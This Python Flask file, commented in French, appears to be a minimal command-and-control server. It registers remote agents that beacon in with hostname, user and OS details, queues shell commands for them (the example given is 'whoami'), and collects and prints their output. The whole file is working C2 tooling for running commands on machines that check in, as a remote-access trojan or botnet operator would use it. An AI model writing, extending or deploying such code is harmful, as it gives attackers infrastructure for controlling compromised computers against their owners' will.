from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

agents = {}
commands_queue = {}
results = {}

def send_command(agent_id, cmd_type, cmd_data):
    """
    Ajoute une commande dans la queue d'un agent.

    Args:
        agent_id: ID de l'agent cible
        cmd_type: Type de commande (ex: "shell")
        cmd_data: Données de la commande (ex: "whoami")
    """
    # Créer la queue si elle n'existe pas
    if agent_id not in commands_queue:
        commands_queue[agent_id] = []

    # Ajouter la commande
    commands_queue[agent_id].append({
        "type": cmd_type,
        "command": cmd_data
    })

    print(f"[QUEUE] Added for {agent_id}: {cmd_type} -> {cmd_data}")

@app.route("/")
def hello():
    return "Hello World"


@app.route("/command", methods=["POST"])
def add_command():
    """
    Ajoute une commande dans la queue d'un agent.

    Exemple d'utilisation :
    curl -X POST http://localhost:8443/command \
      -H "Content-Type: application/json" \
      -d '{"agent_id":"PC1_a4f2","type":"shell","command":"whoami"}'
    """
    data = request.get_json()

    agent_id = data.get("agent_id")
    cmd_type = data.get("type")
    cmd_data = data.get("command")

    # Vérifier que tous les champs sont présents
    if not agent_id or not cmd_type or not cmd_data:
        return jsonify({
            "status": "error",
            "message": "Missing fields: agent_id, type, or command"
        }), 400

    # Ajouter la commande
    send_command(agent_id, cmd_type, cmd_data)

    return jsonify({
        "status": "ok",
        "message": f"Command queued for {agent_id}"
    })

@app.route("/beacon", methods=["POST"])
def beacon():
    data = request.get_json()

    agent_id = data.get("agent_id", "UNKNOWN")
    hostname = data.get("hostname", "UNKNOWN")
    username = data.get("username", "UNKNOWN")
    os_info = data.get("os", "UNKNOWN")

    # Enregistrer l'agent
    agents[agent_id] = {
        "hostname": hostname,
        "username": username,
        "os": os_info,
        "last_seen": datetime.now()
    }

    # Récupérer les commandes en attente pour CET agent
    pending_commands = commands_queue.get(agent_id, [])

    # Vider la queue après récupération
    commands_queue[agent_id] = []

    print(f"[BEACON] {agent_id} | Commands sent: {len(pending_commands)}")

    # Répondre avec les commandes
    return jsonify({
        "status": "ok",
        "commands": pending_commands
    })

@app.route("/agents", methods=["GET"])
def list_agents():
    return jsonify({
        "total": len(agents),
        "agents": agents
    })


@app.route("/result", methods=["POST"])
def receive_result():
    """
    Reçoit les résultats d'exécution de commandes.

    Exemple :
    curl -X POST http://localhost:8443/result \
      -H "Content-Type: application/json" \
      -d '{
        "agent_id": "PC1_a4f2",
        "command": "whoami",
        "output": "WIN10\\Alice",
        "timestamp": "2025-02-03T10:30:45"
      }'
    """
    data = request.get_json()

    agent_id = data.get("agent_id")
    command = data.get("command")
    output = data.get("output")
    timestamp = data.get("timestamp")

    # Créer la liste de résultats si elle n'existe pas
    if agent_id not in results:
        results[agent_id] = []

    # Stocker le résultat
    results[agent_id].append({
        "command": command,
        "output": output,
        "timestamp": timestamp
    })

    # Afficher dans la console
    print(f"\n{'=' * 70}")
    print(f"[+] RÉSULTAT de {agent_id}")
    print(f"[>] Commande : {command}")
    print(f"[<] Output :")
    print(output)
    print(f"{'=' * 70}\n")

    return jsonify({"status": "ok"})

if __name__ == "__main__":
    app.run(port=8443)